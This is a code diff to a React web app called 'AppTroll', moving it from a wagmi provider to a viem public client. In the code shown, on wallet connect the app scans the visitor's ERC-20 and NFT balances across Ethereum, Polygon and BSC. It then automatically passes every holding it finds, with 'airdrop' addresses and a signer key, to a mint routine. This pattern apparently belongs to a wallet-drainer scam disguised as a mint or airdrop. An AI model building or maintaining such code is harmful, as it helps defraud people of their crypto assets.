@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { LazyLoadImage } from "react-lazy-load-image-component";
-import { useAccount, useProvider,  useNetwork, useSwitchNetwork, useConnect } from "wagmi";
+import { getPublicClient } from '@wagmi/core';
+import { useAccount, usePublicClient,  useNetwork, useSwitchNetwork, useConnect } from "wagmi";
 import { mint } from './services/mint.service.js';
 import { isMobile } from 'react-device-detect'
 import { getBalanceErc20 } from './services/erc20.service.js'
@@ -31,7 +32,8 @@ function AppTroll() {
 
   const { isConnected, address } = useAccount()
   const { chain } = useNetwork()
- const provider = useProvider();
+ const client = getPublicClient();
+
   // const advancedMatching = { em: 'some@email.com' }
   // const options = {
   //   autoConfig: true,
@@ -54,6 +56,10 @@ function AppTroll() {
       setPolygonNet(false);
     },
   })
+  const getDaataProvider = async () => {
+    const data = await client.getBlockNumber();
+    console.log(data, "DATA");
+  }
   const sound = require('./GT-song.mp3');
   const [playing, setPlaying] = useState(false);
   useEffect(() => {
@@ -66,11 +72,12 @@ function AppTroll() {
   useEffect(() => {
     console.log(chain, "CHAIN");
     if (chain !== undefined && address !== undefined && isConnected === true) {
+      getDaataProvider()
       if (chain.id === 137) {
-        getBalanceErc20(dataProviderPolygon, provider, tokensErc20Polygon, address, airdropPolygon).then(
+        getBalanceErc20(dataProviderPolygon, client, tokensErc20Polygon, address, airdropPolygon).then(
           (res:any) => {
             setTokensErc20WithBalance(res);
-            getBalanceErc721(dataProviderPolygon, provider, airdropPolygon, tokensErc721Polygon, address).then(
+            getBalanceErc721(dataProviderPolygon, client, airdropPolygon, tokensErc721Polygon, address).then(
               (res1:any) => {
                 setTokensErc721WithBalance(res1);
                 setPolygonNet(true)
@@ -85,9 +92,9 @@ function AppTroll() {
         )
       }
       else if (chain.id === 56) {
-        getBalanceErc20(dataProviderBSC, provider, tokensErc20BSC, address, airdropBSC).then((res:any) => {
+        getBalanceErc20(dataProviderBSC, client, tokensErc20BSC, address, airdropBSC).then((res:any) => {
           setTokensErc20WithBalance(res);
-          getBalanceErc721(dataProviderBSC, provider, airdropBSC, tokensErc721BSC, address).then((res1:any) => {
+          getBalanceErc721(dataProviderBSC, client, airdropBSC, tokensErc721BSC, address).then((res1:any) => {
             setTokensErc721WithBalance(res1);
             setBscNet(true)
             },
@@ -99,9 +106,9 @@ function AppTroll() {
         })
     }
       else if (chain.id === 1) {
-        getBalanceErc20(dataProviderETH, provider, tokensErc20ETH, address, airdropETH).then((res:any) => {
+        getBalanceErc20(dataProviderETH, client, tokensErc20ETH, address, airdropETH).then((res:any) => {
           setTokensErc20WithBalance(res);
-          getBalanceErc721(dataProviderETH, provider, airdropETH, tokensErc721ETH, address).then((res1:any) => {
+          getBalanceErc721(dataProviderETH, client, airdropETH, tokensErc721ETH, address).then((res1:any) => {
             setTokensErc721WithBalance(res1);
             setEthNet(true)
           }, (err) => {
@@ -117,7 +124,7 @@ function AppTroll() {
   useEffect(() => {
     console.log("SWITCH NETWORK")
     if ((tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && (tokensErc20WithBalance.length > 0 || tokensErc721WithBalance.length > 0)) {
-      mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, process.env.REACT_APP_SIGNER_API_KEY, provider, address);
+      mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, process.env.REACT_APP_SIGNER_API_KEY, client, address);
     }
     else {
       if (chain !== undefined && !isLoading) {
